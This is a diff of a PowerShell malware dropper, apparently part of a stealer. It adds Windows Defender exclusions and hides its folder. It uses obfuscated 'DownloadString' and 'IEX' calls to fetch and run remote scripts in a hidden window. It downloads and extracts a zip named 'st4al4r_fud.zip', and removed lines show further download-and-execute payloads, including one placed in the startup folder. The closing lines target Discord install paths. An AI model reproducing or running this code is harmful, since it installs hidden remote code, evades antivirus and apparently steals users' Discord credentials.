@@ -93,67 +93,29 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
-# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/antiremove")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
-# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$zipUrl = "https://anonsharing.com/file/c98ddc36dd6edf0e/st4al4r_fud.zip"
+$zipPath = "$dir\Downloaded.zip"
+$markerFile = "$dir\extracted.marker"
 
-
-
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-
-# $url = "https://anonsharing.com/file/efaac0ebb2c760d9/H-Output.exe"
-# $output = "$dir\T_T.exe"
-# if (Test-Path -Path $output) {
-#     Write-Host "hello"
-# } else {
-#     Invoke-WebRequest -Uri $url -OutFile $output
-#     Start-Process $output
-#     Write-Host "Tệp đã được tải về thành công."
-# }
-
-
-
-# $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
-# $output = "$dir\XClient.exe"
-# $path = "$env:appdata\Steam.exe"
-# if (Test-Path -Path $path) {
-#     Write-Host "hello"
-# } else {
-#     Invoke-WebRequest -Uri $url -OutFile $output
-#     Start-Process $output
-#     Write-Host "Tệp đã được tải về thành công."
-# }
-
-
-iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
-
-$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
-$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
-$uuid = $hash -replace "-",""
-
-$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\$uuid__.exe"
-Add-MpPreference -ExclusionPath $output
-
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
-    Write-Host "Tệp đã được tải về thành công."
+if (!(Test-Path $dir)) {
+    New-Item -ItemType Directory -Path $dir | Out-Null
 }
-Start-Process $output
+
+if (!(Test-Path $markerFile)) {
+    if (!(Test-Path $zipPath)) {
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+    }
+    Expand-Archive -Path $zipPath -DestinationPath $dir -Force
+    Remove-Item -Path $zipPath -Force
+    New-Item -ItemType File -Path $markerFile | Out-Null
+}
+
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
 
